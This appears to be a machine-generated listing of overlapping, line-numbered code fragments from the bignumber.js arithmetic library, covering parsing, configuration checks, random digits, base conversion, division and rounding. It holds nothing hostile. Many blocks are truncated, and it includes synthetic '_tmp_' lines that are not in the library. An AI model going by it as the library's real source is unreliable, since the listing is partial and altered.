// File: tmp/tmp0uk3y5_k/bignum.js/package/bignumber.js
// ======================================================================
Line 1: {
  'use strict';

/*
 *      bignumber.js v9.1.2
 *      A JavaScript library for arbitrary-precision arithmetic.
 *      https://github.com/MikeMcl/bignumber.js
 *      Copyright (c) 2022 Michael Mclaughlin <M8ch88l@gmail.com>
 *      MIT Licensed.
 *
 *      BigNumber.prototype methods     |  BigNumber methods
 *                                      |
 *      absoluteValue            abs    |  clone
 *      comparedTo                      |  config               set
 *      decimalPlaces            dp     |      DECIMAL_PLACES
 *      dividedBy                div    |      ROUNDING_MODE
 *      dividedToIntegerBy       idiv   |      EXPONENTIAL_AT
 *      exponentiatedBy          pow    |      RANGE
 *      integerValue                    |      CRYPTO
 *      isEqualTo                eq     |      MODULO_MODE
 *      isFinite                        |      POW_PRECISION
 *      isGreaterThan            gt     |      FORMAT
 *      isGreaterThanOrEqualTo   gt...
Line 52: var BigNumber,
    isNumeric = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,
    mathceil = Math.ceil,
    mathfloor = Math.floor,

    bignumberError = '[BigNumber Error] ',
    tooManyDigits = bignumberError + 'Number primitive has more than 15 significant digits: ',

    BASE = 1e14,
    LOG_BASE = 14,
    MAX_SAFE_INTEGER = 0x1fffffffffffff,         // 2^53 - 1
    // MAX_INT32 = 0x7fffffff,                   // 2^31 - 1
    POWS_TEN = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13],
    SQRT_BASE = 1e7,

    // EDITABLE
    // The limit on the value of DECIMAL_PLACES, TO_EXP_NEG, TO_EXP_POS, MIN_EXP, MAX_EXP, and
    // the arguments to toExponential, toFixed, toFormat, and toPrecision.
    MAX = 1E9;
Line 53: var isNumeric = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i
Line 57: var bignumberError = '[BigNumber Error] '
Line 64: var POWS_TEN = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13]
Line 196: {
            x.c = [x.e = 0];
          }
Line 197: _tmp_1.push(x.e = 0)
Line 217: {
              x.e = e;
              x.c = [v];
            }
Line 219: _tmp_3.push(v)
Line 228: isNumeric.test(str = String(v))
Line 252: intCheck(b, 2, ALPHABET.length, 'Base')
Line 266: parseNumeric(x, str, isNum, b)
Line 305: parseNumeric(x, String(v), isNum, b)
Line 341: {

          // Zero.
          x.c = [x.e = 0];
        }
Line 344: _tmp_5.push(x.e = 0)
Line 345: {
          x.e = e;
          x.c = [];

          // Transform base

          // e is the base 10 exponent.
          // i is where to slice str to get the first element of the coefficient array.
          i = (e + 1) % LOG_BASE;
          if (e < 0) i += LOG_BASE;  // i < 1

          if (i < len) {
            if (i) x.c.push(+str.slice(0, i));

            for (len -= LOG_BASE; i < len;) {
              x.c.push(+str.slice(i, i += LOG_BASE));
            }

            i = LOG_BASE - (str = str.slice(i)).length;
          } else {
            i -= len;
          }

          for (; i--; str += '0');
          x.c.push(+str);
        }
Line 347: x.c = []
Line 357: x.c.push(+str.slice(0, i))
Line 360: x.c.push(+str.slice(i, i += LOG_BASE))
Line 369: x.c.push(+str)
Line 371: {

        // Zero.
        x.c = [x.e = 0];
      }
Line 374: _tmp_9.push(x.e = 0)
Line 439: {
            v = obj[p];
            intCheck(v, 0, MAX, p);
            DECIMAL_PLACES = v;
          }
Line 440: v = obj[p]
Line 441: intCheck(v, 0, MAX, p)
Line 447: {
            v = obj[p];
            intCheck(v, 0, 8, p);
            ROUNDING_MODE = v;
          }
Line 448: v = obj[p]
Line 449: intCheck(v, 0, 8, p)
Line 457: {
            v = obj[p];
            if (v && v.pop) {
              intCheck(v[0], -MAX, 0, p);
              intCheck(v[1], 0, MAX, p);
              TO_EXP_NEG = v[0];
              TO_EXP_POS = v[1];
            } else {
              intCheck(v, -MAX, MAX, p);
              TO_EXP_NEG = -(TO_EXP_POS = v < 0 ? -v : v);
            }
          }
Line 458: v = obj[p]
Line 459: {
              intCheck(v[0], -MAX, 0, p);
              intCheck(v[1], 0, MAX, p);
              TO_EXP_NEG = v[0];
              TO_EXP_POS = v[1];
            }
Line 460: intCheck(v[0], -MAX, 0, p)
Line 461: intCheck(v[1], 0, MAX, p)
Line 462: TO_EXP_NEG = v[0]
Line 463: TO_EXP_POS = v[1]
Line 465: intCheck(v, -MAX, MAX, p)
Line 473: {
            v = obj[p];
            if (v && v.pop) {
              intCheck(v[0], -MAX, -1, p);
              intCheck(v[1], 1, MAX, p);
              MIN_EXP = v[0];
              MAX_EXP = v[1];
            } else {
              intCheck(v, -MAX, MAX, p);
              if (v) {
                MIN_EXP = -(MAX_EXP = v < 0 ? -v : v);
              } else {
                throw Error
                 (bignumberError + p + ' cannot be zero: ' + v);
              }
            }
          }
Line 474: v = obj[p]
Line 475: {
              intCheck(v[0], -MAX, -1, p);
              intCheck(v[1], 1, MAX, p);
              MIN_EXP = v[0];
              MAX_EXP = v[1];
            }
Line 476: intCheck(v[0], -MAX, -1, p)
Line 477: intCheck(v[1], 1, MAX, p)
Line 478: MIN_EXP = v[0]
Line 479: MAX_EXP = v[1]
Line 481: intCheck(v, -MAX, MAX, p)
Line 494: {
            v = obj[p];
            if (v === !!v) {
              if (v) {
                if (typeof crypto != 'undefined' && crypto &&
                 (crypto.getRandomValues || crypto.randomBytes)) {
                  CRYPTO = v;
                } else {
                  CRYPTO = !v;
                  throw Error
                   (bignumberError + 'crypto unavailable');
                }
              } else {
                CRYPTO = v;
              }
            } else {
              throw Error
               (bignumberError + p + ' not true or false: ' + v);
            }
          }
Line 495: v = obj[p]
Line 517: {
            v = obj[p];
            intCheck(v, 0, 9, p);
            MODULO_MODE = v;
          }
Line 518: v = obj[p]
Line 519: intCheck(v, 0, 9, p)
Line 525: {
            v = obj[p];
            intCheck(v, 0, MAX, p);
            POW_PRECISION = v;
          }
Line 526: v = obj[p]
Line 527: intCheck(v, 0, MAX, p)
Line 533: {
            v = obj[p];
            if (typeof v == 'object') FORMAT = v;
            else throw Error
             (bignumberError + p + ' not an object: ' + v);
          }
Line 534: v = obj[p]
Line 542: {
            v = obj[p];

            // Disallow if less than two characters,
            // or if it contains '+', '-', '.', whitespace, or a repeated character.
            if (typeof v == 'string' && !/^.?$|[+\-.\s]|(.).*\1/.test(v)) {
              alphabetHasNormalDecimalDigits = v.slice(0, 10) == '0123456789';
              ALPHABET = v;
            } else {
              throw Error
               (bignumberError + p + ' invalid: ' + v);
            }
          }
Line 543: v = obj[p]
Line 547: /^.?$|[+\-.\s]|(.).*\1/.test(v)
Line 564: {
        DECIMAL_PLACES: DECIMAL_PLACES,
        ROUNDING_MODE: ROUNDING_MODE,
        EXPONENTIAL_AT: [TO_EXP_NEG, TO_EXP_POS],
        RANGE: [MIN_EXP, MAX_EXP],
        CRYPTO: CRYPTO,
        MODULO_MODE: MODULO_MODE,
        POW_PRECISION: POW_PRECISION,
        FORMAT: FORMAT,
        ALPHABET: ALPHABET
      }
Line 567: _tmp_19.EXPONENTIAL_AT = [TO_EXP_NEG, TO_EXP_POS]
Line 568: _tmp_19.RANGE = [MIN_EXP, MAX_EXP]
Line 596: {}.toString.call(c)
Line 614: {
              n = c[i];
              if (n < 0 || n >= BASE || n !== mathfloor(n)) break out;
            }
Line 615: n = c[i]
Line 640: maxOrMin(arguments, -1)
Line 650: maxOrMin(arguments, 1)
Line 676: {
        var a, b, e, k, v,
          i = 0,
          c = [],
          rand = new BigNumber(ONE);

        if (dp == null) dp = DECIMAL_PLACES;
        else intCheck(dp, 0, MAX);

        k = mathceil(dp / LOG_BASE);

        if (CRYPTO) {

          // Browsers supporting crypto.getRandomValues.
          if (crypto.getRandomValues) {

            a = crypto.getRandomValues(new Uint32Array(k *= 2));

            for (; i < k;) {

              // 53 bits:
              // ((Math.pow(2, 32) - 1) * Math.pow(2, 21)).toString(2)
              // 11111 11111111 11111111 11111111 11100000 00000000 00000000
              // ((Math.pow(2, 32) - 1) >>> 11).toString(2)
              //                                     11111 11111111 11111111
              // 0x20000 is 2^21.
              v = a[i] * 0x20000 + (a[i + 1] >>> 11);

              // Rejection sampling:
              // 0 <= v < 9007199254740992
              // Probability that v >= 9e15, is
...
Line 677: var a, b, e, k, v,
          i = 0,
          c = [],
          rand = new BigNumber(ONE);
Line 679: var c = []
Line 683: intCheck(dp, 0, MAX)
Line 685: mathceil(dp / LOG_BASE)
Line 694: {

              // 53 bits:
              // ((Math.pow(2, 32) - 1) * Math.pow(2, 21)).toString(2)
              // 11111 11111111 11111111 11111111 11100000 00000000 00000000
              // ((Math.pow(2, 32) - 1) >>> 11).toString(2)
              //                                     11111 11111111 11111111
              // 0x20000 is 2^21.
              v = a[i] * 0x20000 + (a[i + 1] >>> 11);

              // Rejection sampling:
              // 0 <= v < 9007199254740992
              // Probability that v >= 9e15, is
              // 7199254740992 / 9007199254740992 ~= 0.0008, i.e. 1 in 1251
              if (v >= 9e15) {
                b = crypto.getRandomValues(new Uint32Array(2));
                a[i] = b[0];
                a[i + 1] = b[1];
              } else {

                // 0 <= v <= 8999999999999999
                // 0 <= (v % 1e14) <= 99999999999999
                c.push(v % 1e14);
                i += 2;
              }
            }
Line 702: v = a[i] * 0x20000 + (a[i + 1] >>> 11)
Line 708: {
                b = crypto.getRandomValues(new Uint32Array(2));
                a[i] = b[0];
                a[i + 1] = b[1];
              }
Line 710: a[i] = b[0]
Line 711: a[i + 1] = b[1]
Line 716: c.push(v % 1e14)
Line 726: a = crypto.randomBytes(k *= 7)
Line 728: {

              // 0x1000000000000 is 2^48, 0x10000000000 is 2^40
              // 0x100000000 is 2^32, 0x1000000 is 2^24
              // 11111 11111111 11111111 11111111 11111111 11111111 11111111
              // 0 <= v < 9007199254740992
              v = ((a[i] & 31) * 0x1000000000000) + (a[i + 1] * 0x10000000000) +
                 (a[i + 2] * 0x100000000) + (a[i + 3] * 0x1000000) +
                 (a[i + 4] << 16) + (a[i + 5] << 8) + a[i + 6];

              if (v >= 9e15) {
                crypto.randomBytes(7).copy(a, i);
              } else {

                // 0 <= (v % 1e14) <= 99999999999999
                c.push(v % 1e14);
                i += 7;
              }
            }
Line 734: v = ((a[i] & 31) * 0x1000000000000) + (a[i + 1] * 0x10000000000) +
                 (a[i + 2] * 0x100000000) + (a[i + 3] * 0x1000000) +
                 (a[i + 4] << 16) + (a[i + 5] << 8) + a[i + 6]
Line 735: a[i + 2] * 0x100000000
Line 736: a[i + 4] << 16
Line 739: (_tmp_27 = crypto.randomBytes(7))
Line 743: c.push(v % 1e14)
Line 764: k = c[--i]
Line 768: {
          v = POWS_TEN[LOG_BASE - dp];
          c[i] = mathfloor(k / v) * v;
        }
Line 769: v = POWS_TEN[LOG_BASE - dp]
Line 770: c[i] = mathfloor(k / v) * v
Line 777: {
          c = [e = 0];
        }
Line 778: _tmp_28.push(e = 0)
Line 803: {
      var i = 1,
        args = arguments,
        sum = new BigNumber(args[0]);
      for (; i < args.length;) sum = sum.plus(args[i++]);
      return sum;
    }
Line 804: var i = 1,
        args = arguments,
        sum = new BigNumber(args[0]);
Line 806: var sum = new BigNumber(args[0])
Line 807: sum.plus(args[i++])
Line 824: {
        var j,
          arr = [0],
          arrL,
          i = 0,
          len = str.length;

        for (; i < len;) {
          for (arrL = arr.length; arrL--; arr[arrL] *= baseIn);

          arr[0] += alphabet.indexOf(str.charAt(i++));

          for (j = 0; j < arr.length; j++) {

            if (arr[j] > baseOut - 1) {
              if (arr[j + 1] == null) arr[j + 1] = 0;
              arr[j + 1] += arr[j] / baseOut | 0;
              arr[j] %= baseOut;
            }
          }
        }

        return arr.reverse();
      }
Line 825: var j,
          arr = [0],
          arrL,
          i = 0,
          len = str.length;
Line 826: _tmp_30.push(0)
Line 831: {
          for (arrL = arr.length; arrL--; arr[arrL] *= baseIn);

          arr[0] += alphabet.indexOf(str.charAt(i++));

          for (j = 0; j < arr.length; j++) {

            if (arr[j] > baseOut - 1) {
              if (arr[j + 1] == null) arr[j + 1] = 0;
              arr[j + 1] += arr[j] / baseOut | 0;
              arr[j] %= baseOut;
            }
          }
        }
Line 834: arr[0] += alphabet.indexOf(str.charAt(i++))
Line 838: {
              if (arr[j + 1] == null) arr[j + 1] = 0;
              arr[j + 1] += arr[j] / baseOut | 0;
              arr[j] %= baseOut;
            }
Line 840: arr[j + 1] += arr[j] / baseOut | 0
Line 841: arr[j] %= baseOut
Line 852: {
        var alphabet, d, e, k, r, x, xc, y,
          i = str.indexOf('.'),
          dp = DECIMAL_PLACES,
          rm = ROUNDING_MODE;

        // Non-integer.
        if (i >= 0) {
          k = POW_PRECISION;

          // Unlimited precision.
          POW_PRECISION = 0;
          str = str.replace('.', '');
          y = new BigNumber(baseIn);
          x = y.pow(str.length - i);
          POW_PRECISION = k;

          // Convert str as if an integer, then restore the fraction part by dividing the
          // result by its base raised to a power.

          y.c = toBaseOut(toFixedPoint(coeffToString(x.c), x.e, '0'),
           10, baseOut, decimal);
          y.e = y.c.length;
        }

        // Convert the number as integer.

        xc = toBaseOut(str, baseIn, baseOut, callerIsToString
         ? (alphabet = ALPHABET, decimal)
         : (alphabet = decimal, ALPHABET));

        // xc now represents str as an integer and converted to base...
Line 872: toFixedPoint(coeffToString(x.c), x.e, '0')
Line 913: i = xc[d]
Line 918: r = r || d < 0 || xc[d + 1] != null
Line 920: r = rm < 4 ? (i != null || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2))
              : i > k || i == k &&(rm == 4 || r || rm == 6 && xc[d - 1] & 1 ||
               rm == (x.s < 0 ? 8 : 7))
Line 921: i > k || i == k &&(rm == 4 || r || rm == 6 && xc[d - 1] & 1 ||
               rm == (x.s < 0 ? 8 : 7))
Line 930: toFixedPoint(alphabet.charAt(1), -dp, alphabet.charAt(0))
Line 940: {
              xc[d] = 0;

              if (!d) {
                ++e;
                xc = [1].concat(xc);
              }
            }
Line 941: xc[d] = 0
Line 943: {
                ++e;
                xc = [1].concat(xc);
              }
Line 945: xc = [1].concat(xc)
Line 957: toFixedPoint(str, e, alphabet.charAt(0))
Line 977: {
          xlo = x[i] % SQRT_BASE;
          xhi = x[i] / SQRT_BASE | 0;
          m = khi * xlo + xhi * klo;
          temp = klo * xlo + ((m % SQRT_BASE) * SQRT_BASE) + carry;
          carry = (temp / base | 0) + (m / SQRT_BASE | 0) + khi * xhi;
          x[i] = temp % base;
        }
Line 978: xlo = x[i] % SQRT_BASE
Line 979: xhi = x[i] / SQRT_BASE | 0
Line 983: x[i] = temp % base
Line 986: _tmp_35.push(carry)
Line 1000: {
              cmp = a[i] > b[i] ? 1 : -1;
              break;
            }
Line 1001: cmp = a[i] > b[i] ? 1 : -1
Line 1014: {
          a[aL] -= i;
          i = a[aL] < b[aL] ? 1 : 0;
          a[aL] = i * base + a[aL] - b[aL];
        }
Line 1015: a[aL] -= i
Line 1016: i = a[aL] < b[aL] ? 1 : 0
Line 1017: a[aL] = i * base + a[aL] - b[aL]
Line 1025: {
        var cmp, e, i, more, n, prod, prodL, q, qc, rem, remL, rem0, xi, xL, yc0,
          yL, yz,
          s = x.s == y.s ? 1 : -1,
          xc = x.c,
          yc = y.c;

        // Either NaN, Infinity or 0?
        if (!xc || !xc[0] || !yc || !yc[0]) {

          return new BigNumber(

           // Return NaN if either NaN, or both Infinity or 0.
           !x.s || !y.s || (xc ? yc && xc[0] == yc[0] : !yc) ? NaN :

            // Return ±0 if x is ±0 or y is ±Infinity, or return ±Infinity as y is ±0.
            xc && xc[0] == 0 || !yc ? s * 0 : s / 0
         );
        }

        q = new BigNumber(s);
        qc = q.c = [];
        e = x.e - y.e;
        s = dp + e + 1;

        if (!base) {
          base = BASE;
          e = bitFloor(x.e / LOG_BASE) - bitFloor(y.e / LOG_BASE);
          s = s / LOG_BASE | 0;
        }

        // Result exponent may be one less then the current value of e.
        // The coefficients of the BigNumbers f...
Line 1035: new BigNumber(

           // Return NaN if either NaN, or both Infinity or 0.
           !x.s || !y.s || (xc ? yc && xc[0] == yc[0] : !yc) ? NaN :

            // Return ±0 if x is ±0 or y is ±Infinity, or return ±Infinity as y is ±0.
            xc && xc[0] == 0 || !yc ? s * 0 : s / 0
         )
Line 1038: !x.s || !y.s || (xc ? yc && xc[0] == yc[0] : !yc) ? NaN : xc && xc[0] == 0 || !yc ? s * 0 : s / 0
Line 1041: xc && xc[0] == 0 || !yc ? s * 0 : s / 0
Line 1046: qc = q.c = []
Line 1052: bitFloor(x.e / LOG_BASE)
Line 1063: qc.push(1)
Line 1065: {
          xL = xc.length;
          yL = yc.length;
          i = 0;
          s += 2;

          // Normalise xc and yc so highest order digit of yc is >= base / 2.

          n = mathfloor(base / (yc[0] + 1));

          // Not necessary, but to handle odd bases where yc[0] == (base / 2) - 1.
          // if (n > 1 || n++ == 1 && yc[0] < base / 2) {
          if (n > 1) {
            yc = multiply(yc, n, base);
            xc = multiply(xc, n, base);
            yL = yc.length;
            xL = xc.length;
          }

          xi = yL;
          rem = xc.slice(0, yL);
          remL = rem.length;

          // Add zeros to make remainder as long as divisor.
          for (; remL < yL; rem[remL++] = 0);
          yz = yc.slice();
          yz = [0].concat(yz);
          yc0 = yc[0];
          if (yc[1] >= base / 2) yc0++;
          // Not necessary, but to prevent trial digit n > base, when using base 3.
          // else if (base == 3 && yc0 == 1) ...
Line 1073: n = mathfloor(base / (yc[0] + 1))
Line 1078: multiply(yc, n, base)
Line 1079: multiply(xc, n, base)
Line 1091: yz = [0].concat(yz)
Line 1092: yc0 = yc[0]
Line 1097: {
            n = 0;

            // Compare divisor and remainder.
            cmp = compare(yc, rem, yL, remL);

            // If divisor < remainder.
            if (cmp < 0) {

              // Calculate trial digit, n.

              rem0 = rem[0];
              if (yL != remL) rem0 = rem0 * base + (rem[1] || 0);

              // n is how many times the divisor goes into the current remainder.
              n = mathfloor(rem0 / yc0);

              //  Algorithm:
              //  product = divisor multiplied by trial digit (n).
              //  Compare product and remainder.
              //  If product is greater than remainder:
              //    Subtract divisor from product, decrement trial digit.
              //  Subtract product from remainder.
              //  If product was less than remainder at the last compare:
              //    Compare new remainder and divisor.
              //    If remainder is greater than divisor:
            ...
Line 1104: {

              // Calculate trial digit, n.

              rem0 = rem[0];
              if (yL != remL) rem0 = rem0 * base + (rem[1] || 0);

              // n is how many times the divisor goes into the current remainder.
              n = mathfloor(rem0 / yc0);

              //  Algorithm:
              //  product = divisor multiplied by trial digit (n).
              //  Compare product and remainder.
              //  If product is greater than remainder:
              //    Subtract divisor from product, decrement trial digit.
              //  Subtract product from remainder.
              //  If product was less than remainder at the last compare:
              //    Compare new remainder and divisor.
              //    If remainder is greater than divisor:
              //      Subtract divisor from remainder, increment trial digit.

              if (n > 1) {

                // n may be > base only when base is 3.
                if (n >= base)...
Line 1108: rem0 = rem[0]
Line 1131: multiply(yc, n, base)
Line 1143: subtract(prod, yL < prodL ? yz : yc, prodL, base)
Line 1164: _tmp_41.push(0)
Line 1167: subtract(rem, prod, remL, base)
Line 1181: subtract(rem, yL < remL ? yz : yc, remL, base)
Line 1185: {
              n++;
              rem = [0];
            }
Line 1187: _tmp_42.push(0)
Line 1191: qc[i++] = n
Line 1194: {
              rem[remL++] = xc[xi] || 0;
            }
Line 1195: rem[remL++] = xc[xi] || 0
Line 1196: {
              rem = [xc[xi]];
              remL = 1;
            }
Line 1197: _tmp_43.push(xc[xi])
Line 1200: xi++
Line 1202: more = rem[0] != null
Line 1235: {
      var c0, e, ne, len, str;

      if (rm == null) rm = ROUNDING_MODE;
      else intCheck(rm, 0, 8);

      if (!n.c) return n.toString();

      c0 = n.c[0];
      ne = n.e;

      if (i == null) {
        str = coeffToString(n.c);
        str = id == 1 || id == 2 && (ne <= TO_EXP_NEG || ne >= TO_EXP_POS)
         ? toExponential(str, ne)
         : toFixedPoint(str, ne, '0');
      } else {
        n = round(new BigNumber(n), i, rm);

        // n.e may have changed if the value was rounded up.
        e = n.e;

        str = coeffToString(n.c);
        len = str.length;

        // toPrecision returns exponential notation if the number of significant digits
        // specified is less than the number of digits necessary to represent the integer
        // part of the value in fixed-point notation.

        // Exponential notation.
        if (id == 1 || id == 2 && (i <= e || e <= TO_EXP_NEG)) {

          // Append zeros?
          for (; l...
Line 1239: intCheck(rm, 0, 8)
Line 1241: n.toString()
Line 1243: c0 = n.c[0]
Line 1250: toFixedPoint(str, ne, '0')
Line 1274: toFixedPoint(str, e, '0')
Line 1295: {
      var k, y,
        i = 1,
        x = new BigNumber(args[0]);

      for (; i < args.length; i++) {
        y = new BigNumber(args[i]);
        if (!y.s || (k = compare(x, y)) === n || k === 0 && x.s === n) {
          x = y;
        }
      }

      return x;
    }
Line 1296: var k, y,
        i = 1,
        x = new BigNumber(args[0]);
Line 1298: var x = new BigNumber(args[0])
Line 1300: {
        y = new BigNumber(args[i]);
        if (!y.s || (k = compare(x, y)) === n || k === 0 && x.s === n) {
          x = y;
        }
      }
Line 1301: y = new BigNumber(args[i])
Line 1332: {

        // Zero.
        n.c = [n.e = 0];
      }
Line 1335: _tmp_13.push(n.e = 0)
Line 1346: {
      var basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i,
        dotAfter = /^([^.]+)\.$/,
        dotBefore = /^\.([^.]+)$/,
        isInfinityOrNaN = /^-?(Infinity|NaN)$/,
        whitespaceOrPlus = /^\s*\+(?=[\w.])|^\s+|\s+$/g;

      return function (x, str, isNum, b) {
        var base,
          s = isNum ? str : str.replace(whitespaceOrPlus, '');

        // No exception on ±Infinity or NaN.
        if (isInfinityOrNaN.test(s)) {
          x.s = isNaN(s) ? null : s < 0 ? -1 : 1;
        } else {
          if (!isNum) {

            // basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i
            s = s.replace(basePrefix, function (m, p1, p2) {
              base = (p2 = p2.toLowerCase()) == 'x' ? 16 : p2 == 'b' ? 2 : 8;
              return !b || b == base ? p1 : m;
            });

            if (b) {
              base = b;

              // E.g. '1.' to '1', '.1' to '0.1'
              s = s.replace(dotAfter, '$1').replace(dotBefore, '0.$1');
         ...
Line 1347: var basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i,
        dotAfter = /^([^.]+)\.$/,
        dotBefore = /^\.([^.]+)$/,
        isInfinityOrNaN = /^-?(Infinity|NaN)$/,
        whitespaceOrPlus = /^\s*\+(?=[\w.])|^\s+|\s+$/g;
Line 1348: var dotAfter = /^([^.]+)\.$/
Line 1349: var dotBefore = /^\.([^.]+)$/
Line 1351: var whitespaceOrPlus = /^\s*\+(?=[\w.])|^\s+|\s+$/g
Line 1358: isInfinityOrNaN.test(s)
Line 1413: {

          // Get the number of digits of the first element of xc.
          for (d = 1, k = xc[0]; k >= 10; k /= 10, d++);
          i = sd - d;

          // If the rounding digit is in the first element of xc...
          if (i < 0) {
            i += LOG_BASE;
            j = sd;
            n = xc[ni = 0];

            // Get the rounding digit at index j of n.
            rd = mathfloor(n / pows10[d - j - 1] % 10);
          } else {
            ni = mathceil((i + 1) / LOG_BASE);

            if (ni >= xc.length) {

              if (r) {

                // Needed by sqrt.
                for (; xc.length <= ni; xc.push(0));
                n = rd = 0;
                d = 1;
                i %= LOG_BASE;
                j = i - LOG_BASE + 1;
              } else {
                break out;
              }
            } else {
              n = k = xc[ni];

              // Get the number of digits of n.
              for (d = 1; k >= 10; ...
Line 1420: {
            i += LOG_BASE;
            j = sd;
            n = xc[ni = 0];

            // Get the rounding digit at index j of n.
            rd = mathfloor(n / pows10[d - j - 1] % 10);
          }
Line 1423: n = xc[ni = 0]
Line 1426: rd = mathfloor(n / pows10[d - j - 1] % 10)
Line 1428: mathceil((i + 1) / LOG_BASE)
Line 1435: xc.push(0)
Line 1443: {
              n = k = xc[ni];

              // Get the number of digits of n.
              for (d = 1; k >= 10; k /= 10, d++);

              // Get the index of rd within n.
              i %= LOG_BASE;

              // Get the index of rd within n, adjusted for leading zeros.
              // The number of leading zeros of n is given by LOG_BASE - d.
              j = i - LOG_BASE + d;

              // Get the rounding digit at index j of n.
              rd = j < 0 ? 0 : mathfloor(n / pows10[d - j - 1] % 10);
            }
Line 1444: n = k = xc[ni]
Line 1457: rd = j < 0 ? 0 : mathfloor(n / pows10[d - j - 1] % 10)
Line 1461: r = r || sd < 0 ||

          // Are there any non-zero digits after the rounding digit?
          // The expression  n % pows10[d - j - 1]  returns all digits of n to the right
          // of the digit at j, e.g. if n is 908714 and j is 2, the expression gives 714.
           xc[ni + 1] != null || (j < 0 ? n : n % pows10[d - j - 1])
Line 1466: j < 0 ? n : n % pows10[d - j - 1]
Line 1468: r = rm < 4
           ? (rd || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2))
           : rd > 5 || rd == 5 && (rm == 4 || r || rm == 6 &&

            // Check whether the digit to the left of the rounding digit is odd.
            ((i > 0 ? j > 0 ? n / pows10[d - j] : 0 : xc[ni - 1]) % 10) & 1 ||
             rm == (x.s < 0 ? 8 : 7))
Line 1470: rd > 5 || rd == 5 && (rm == 4 || r || rm == 6 &&

            // Check whether the digit to the left of the rounding digit is odd.
            ((i > 0 ? j > 0 ? n / pows10[d - j] : 0 : xc[ni - 1]) % 10) & 1 ||
             rm == (x.s < 0 ? 8 : 7))
Line 1473: ((i > 0 ? j > 0 ? n / pows10[d - j] : 0 : xc[ni - 1]) % 10) & 1
Line 1479: {

              // Convert sd to decimal places.
              sd -= x.e + 1;

              // 1, 0.1, 0.01, 0.001, 0.0001 etc.
              xc[0] = pows10[(LOG_BASE - sd % LOG_BASE) % LOG_BASE];
              x.e = -sd || 0;
            }
Line 1485: xc[0] = pows10[(LOG_BASE - sd % LOG_BASE) % LOG_BASE]
Line 1487: {

              // Zero.
              xc[0] = x.e = 0;
            }
Line 1490: xc[0] = x.e = 0
Line 1501: {
            xc.length = ni + 1;
            k = pows10[LOG_BASE - i];

            // E.g. 56700 becomes 56000 if 7 is the rounding digit.
            // j > 0 means i > number of leading zeros of n.
            xc[ni] = j > 0 ? mathfloor(n / pows10[d - j] % pows10[j]) * k : 0;
          }
Line 1503: k = pows10[LOG_BASE - i]
Line 1507: xc[ni] = j > 0 ? mathfloor(n / pows10[d - j] % pows10[j]) * k : 0
Line 1516: {

                // i will be the length of xc[0] before k is added.
                for (i = 1, j = xc[0]; j >= 10; j /= 10, i++);
                j = xc[0] += k;
                for (k = 1; j >= 10; j /= 10, k++);

                // if i != k the length has increased.
                if (i != k) {
                  x.e++;
                  if (xc[0] == BASE) xc[0] = 1;
                }

                break;
              }
Line 1520: j = xc[0] += k
Line 1530: {
                xc[ni] += k;
                if (xc[ni] != BASE) break;
                xc[ni--] = 0;
                k = 1;
              }
Line 1531: xc[ni] += k
Line 1533: xc[ni--] = 0
Line 1548: {
          x.c = [x.e = 0];
        }
Line 1549: _tmp_14.push(x.e = 0)
Line 1561: n.toString()
Line 1567: toFixedPoint(str, e, '0')
Line 1616: intCheck(dp, 0, MAX)
Line 1618: intCheck(rm, 0, 8)
Line 1624: bitFloor(this.e / LOG_BASE)
Line 1722: n.e > 9 && (x.e > 0 || x.e < -1 || (x.e == 0
        // [1, 240000000]
        ? x.c[0] > 1 || nIsBig && x.c[1] >= 24e7
        // [80000000000000]  [99999750000000]
        : x.c[0] < 8e13 || nIsBig && x.c[0] <= 9999975e7))
Line 1724: x.c[0] > 1 || nIsBig && x.c[1] >= 24e7
Line 1726: x.c[0] < 8e13 || nIsBig && x.c[0] <= 9999975e7
Line 1742: mathceil(POW_PRECISION / LOG_BASE + 2)
Line 1814: intCheck(rm, 0, 8)
Line 1859: bitFloor(this.e / LOG_BASE)
Line 1947: x.plus(y)
Line 1971: bitFloor(xe)
Line 1972: bitFloor(ye)
Line 1989: t.push(0)
Line 1998: {
            xLTy = xc[b] < yc[b];
            break;
          }
Line 1999: xLTy = xc[b] < yc[b]
Line 2021: {

        if (xc[--j] < yc[j]) {
          for (i = j; i && !xc[--i]; xc[i] = b);
          --xc[i];
          xc[j] += BASE;
        }

        xc[j] -= yc[j];
      }
Line 2023: {
          for (i = j; i && !xc[--i]; xc[i] = b);
          --xc[i];
          xc[j] += BASE;
        }
Line 2025: --xc[i]
Line 2026: xc[j] += BASE
Line 2029: xc[j] -= yc[j]
Line 2036: {

        // Following IEEE 754 (2008) 6.3,
        // n - n = +0  but  n - n = -0  when rounding towards -Infinity.
        y.s = ROUNDING_MODE == 3 ? -1 : 1;
        y.c = [y.e = 0];
        return y;
      }
Line 2041: _tmp_68.push(y.e = 0)
Line 2150: {
            y.c = [0];
            y.e = 0;
          }
Line 2151: _tmp_73.push(0)
Line 2159: bitFloor(y.e / LOG_BASE)
Line 2175: zc.push(0)
Line 2180: {
        c = 0;
        ylo = yc[i] % sqrtBase;
        yhi = yc[i] / sqrtBase | 0;

        for (k = xcL, j = i + k; j > i;) {
          xlo = xc[--k] % sqrtBase;
          xhi = xc[k] / sqrtBase | 0;
          m = yhi * xlo + xhi * ylo;
          xlo = ylo * xlo + ((m % sqrtBase) * sqrtBase) + zc[j] + c;
          c = (xlo / base | 0) + (m / sqrtBase | 0) + yhi * xhi;
          zc[j--] = xlo % base;
        }

        zc[j] = c;
      }
Line 2182: ylo = yc[i] % sqrtBase
Line 2183: yhi = yc[i] / sqrtBase | 0
Line 2185: {
          xlo = xc[--k] % sqrtBase;
          xhi = xc[k] / sqrtBase | 0;
          m = yhi * xlo + xhi * ylo;
          xlo = ylo * xlo + ((m % sqrtBase) * sqrtBase) + zc[j] + c;
          c = (xlo / base | 0) + (m / sqrtBase | 0) + yhi * xhi;
          zc[j--] = xlo % base;
        }
Line 2186: xlo = xc[--k] % sqrtBase
Line 2187: xhi = xc[k] / sqrtBase | 0
